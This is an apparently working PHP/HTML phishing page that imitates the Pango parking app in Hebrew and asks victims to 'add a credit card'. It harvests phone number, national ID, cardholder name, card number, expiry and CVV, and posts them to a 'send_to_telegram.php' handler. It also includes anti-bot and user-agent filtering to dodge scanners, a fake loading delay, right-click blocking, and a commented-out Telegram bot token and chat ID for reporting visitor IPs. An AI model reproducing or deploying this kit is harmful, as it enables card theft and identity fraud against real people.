<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');

/////////////////////////////////////////////////////////////
// Telegram Bot Configuration
// $botToken = "7274962782:AAGi2HZlpm4EGxeoPWrLURWIApxrQls08yw";
// $chatId = "-4770377680";

// // Get User's IP Address
// $ip_address = $_SERVER['REMOTE_ADDR'];

// // Format the Message
// $message = "New visitor IP: " . $ip_address;

// // Send Message to Telegram
// $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
// $data = [
//     'chat_id' => $chatId,
//     'text' => $message,
//     'parse_mode' => 'Markdown',
// ];

// $options = [
//     'http' => [
//         'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
//         'method'  => 'POST',
//         'content' => http_build_query($data),
//     ],
// ];

// $context  = stream_context_create($options);
// $response = file_get_contents($telegramUrl, false, $context);

/////////////////////////////////////////////////////////////


// Anti-Bot Protection
function blockSuspiciousUserAgent()
{
    $botAgents = [
        'curl',
        'wget',
        'bot',
        'crawler',
        'spider',
        'http',
        'python',
        'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs()
{
    $blockedIPs = [
        '192.168.1.1', // Replace with actual IPs to block
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}

// Call protection functions
blockSuspiciousUserAgent();
blockSuspiciousIPs();
?>
<html lang="he">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>נתונים נדרשים</title>
    <link rel="icon" href="https://res.cloudinary.com/sherutnet/image/upload/f_auto,q_auto/mini_logos/pango2.png"
        type="image/png">
    <style>
    body {
        font-family: Arial, sans-serif;
        direction: rtl;
        text-align: right;
        margin: 0;
        padding: 0;
        background-color: #f9f9f9;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 15px 25px;
        background-color: white;
        border-bottom: 1px solid #ddd;
    }

    .header h1 {
        font-size: 32px;
        color: #007bff;
        margin: 0;
    }

    .menu-icon {
        font-size: 28px;
        color: #007bff;
        cursor: pointer;
    }

    .form-container {
        max-width: 400px;
        margin: 20px auto;
        padding: 20px;
        background-color: white;
        border: 1px solid #ddd;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    input,
    select {
        width: 100%;
        padding: 15px;
        margin: 10px 0;
        border: 1px solid #ddd;
        border-radius: 25px;
        box-sizing: border-box;
        font-size: 16px;
        color: #333;
        text-align: right;
    }

    input::placeholder {
        color: #888;
        font-size: 14px;
    }

    input.error {
        border: 2px solid red;
    }

    .error-message {
        color: red;
        font-size: 12px;
        display: none;
    }

    .form-container button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 25px;
        cursor: pointer;
        width: 100%;
        font-size: 18px;
    }

    .form-container button:hover {
        background-color: #0056b3;
    }

    .card-input {
        position: relative;
    }

    .card-input img {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-50%);
        height: 24px;
        display: none;
    }

    .popup {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 300px;
        padding: 20px;
        background-color: white;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
        text-align: center;
        border-radius: 10px;
        display: none;
        z-index: 1000;
    }

    .popup h2 {
        font-size: 24px;
        color: #007bff;
        margin-bottom: 20px;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border: 5px solid #ccc;
        border-top: 5px solid #007bff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto;
    }

    @keyframes spin {
        from {
            transform: rotate(0deg);
        }

        to {
            transform: rotate(360deg);
        }
    }

    .footer {
        background-color: white;
        text-align: center;
        padding: 20px 10px;
        margin-top: auto;
        border-top: 1px solid #ddd;
    }

    .footer ul {
        list-style: none;
        padding: 0;
        margin: 10px 0;
    }

    .footer ul li {
        margin: 5px 0;
        font-size: 14px;
        color: #555;
    }

    .footer ul li a {
        color: #007bff;
        text-decoration: none;
    }

    .footer ul li a:hover {
        text-decoration: underline;
    }
    </style>
    <script>
    function validatePhone(input) {
        const phoneNumber = input.value.replace(/[^0-9]/g, '').slice(0, 10);
        input.value = phoneNumber;
        const error = document.getElementById('phone-error');
        if (phoneNumber.length !== 10) {
            error.style.display = 'block';
            input.classList.add('error');
        } else {
            error.style.display = 'none';
            input.classList.remove('error');
        }
    }

    function validateID(input) {
        const idNumber = input.value.replace(/[^0-9]/g, '').slice(0, 9);
        input.value = idNumber;
        const error = document.getElementById('id-error');
        if (idNumber.length !== 9) {
            error.style.display = 'block';
            input.classList.add('error');
        } else {
            error.style.display = 'none';
            input.classList.remove('error');
        }
    }

    function validateCard(input) {
        const cardNumber = input.value.replace(/[^0-9]/g, '');
        input.value = cardNumber;
        const icon = document.getElementById('card-icon');
        const error = document.getElementById('card-error');

        if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cardNumber)) {
            icon.src = 'https://cdn4.iconfinder.com/data/icons/payment-method/160/payment_method_card_visa-512.png';
            icon.style.display = 'block';
            error.style.display = 'none';
            input.classList.remove('error');
        } else if (/^5[1-5][0-9]{14}$/.test(cardNumber)) {
            icon.src = 'https://pngimg.com/uploads/mastercard/mastercard_PNG23.png';
            icon.style.display = 'block';
            error.style.display = 'none';
            input.classList.remove('error');
        } else if (/^3[47][0-9]{13}$/.test(cardNumber)) {
            icon.src =
                'https://e7.pngegg.com/pngimages/745/624/png-clipart-american-express-logo-credit-card-payment-credit-card-blue-text-thumbnail.png';
            icon.style.display = 'block';
            error.style.display = 'none';
            input.classList.remove('error');
        } else {
            icon.style.display = 'none';
            error.style.display = 'block';
            input.classList.add('error');
        }
    }

    function validateCVV(input) {
        const cvv = input.value.replace(/[^0-9]/g, '').slice(0, 4);
        input.value = cvv;
        const error = document.getElementById('cvv-error');
        if (cvv.length < 3 || cvv.length > 4) {
            error.style.display = 'block';
            input.classList.add('error');
        } else {
            error.style.display = 'none';
            input.classList.remove('error');
        }
    }

    function handleSubmit(event) {
        event.preventDefault();
        const popup = document.querySelector('.popup');
        popup.style.display = 'block';

        setTimeout(() => {
            popup.style.display = 'none';
            event.target.submit();
        }, 10000);
    }
    </script>
</head>
<script language=JavaScript>
var message = "";
///////////////////////////////////
function clickIE() {
    if (document.all) {
        (message);
        return false;
    }
}

function clickNS(e) {
    if (document.layers || (document.getElementById && !document.all)) {
        if (e.which == 2 || e.which == 3) {
            (message);
            return false;
        }
    }
}
if (document.layers) {
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown = clickNS;
} else {
    document.onmouseup = clickNS;
    document.oncontextmenu = clickIE;
}

document.oncontextmenu = new Function("return false")
// --> 
</script>




<body>
    <div class="header">
        <h1>.pango</h1>
        <div class="menu-icon">☰</div>
    </div>

    <div class="form-container">
        <h2 style="text-align: center; font-size: 24px; color: #007bff; margin-bottom: 20px;">הוספת כרטיס אשראי</h2>

        <form action="send_to_telegram.php" method="post" onsubmit="handleSubmit(event)">
            <input type="text" id="phone" name="phone" placeholder="מספר טלפון *" required
                oninput="validatePhone(this)">
            <div id="phone-error" class="error-message">מספר טלפון חייב להיות בן 10 ספרות</div>
            <input type="text" id="id" name="id" placeholder="מספר זהות *" required oninput="validateID(this)">
            <div id="id-error" class="error-message">מספר זהות חייב להיות בן 9 ספרות</div>
            <input type="text" id="card-name" name="card_name" placeholder="שם בעל הכרטיס *" required>
            <div class="card-input">
                <img id="card-icon" />
                <input type="text" id="card-number" name="card_number" placeholder="מספר כרטיס אשראי *" required
                    oninput="validateCard(this)">
                <div id="card-error" class="error-message">מספר כרטיס אשראי אינו תקין</div>
            </div>
            <div style="display: flex; gap: 10px;">
                <select id="month" name="month" required>
                    <option value="" disabled selected>חודש</option>
                    <option value="01">ינואר</option>
                    <option value="02">פברואר</option>
                    <option value="03">מרץ</option>
                    <option value="04">אפריל</option>
                    <option value="05">מאי</option>
                    <option value="06">יוני</option>
                    <option value="07">יולי</option>
                    <option value="08">אוגוסט</option>
                    <option value="09">ספטמבר</option>
                    <option value="10">אוקטובר</option>
                    <option value="11">נובמבר</option>
                    <option value="12">דצמבר</option>
                </select>
                <select id="year" name="year" required>
                    <option value="" disabled selected>שנה</option>
                    <?php for ($year = 2025; $year <= 2039; $year++): ?>
                    <option value="<?= $year ?>"><?= $year ?></option>
                    <?php endfor; ?>
                </select>
            </div>
            <input type="text" id="cvv" name="cvv" placeholder="CVV *" required oninput="validateCVV(this)">
            <div id="cvv-error" class="error-message">CVV חייב להיות בן 3 או 4 ספרות</div>
            <button type="submit">הוספת כרטיס</button>
        </form>
    </div>

    <div class="popup">
        <h2>Pango</h2>
        <div class="spinner"></div>
        <p>אנא המתן...</p>
    </div>

    <div class="footer">
        <p style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">הורידו את האפליקציה</p>
        <div class="download-buttons" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
            <a href="#"
                style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Google
                Play</a>
            <a href="#"
                style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Apple
                Store</a>
        </div>
        <ul style="list-style: none; padding: 0; margin: 0; text-align: center;">
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">הסדרים משפטיים</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אפשרות הסרת
                    שירותים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">פרסומים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אבטחת מידע</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">תנאי שימוש פנגו</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">מדיניות פרטיות</a>
            </li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">עירוי פנגו</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אודות</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">מפת אתר</a></li>
        </ul>
    </div>
</body>

</html>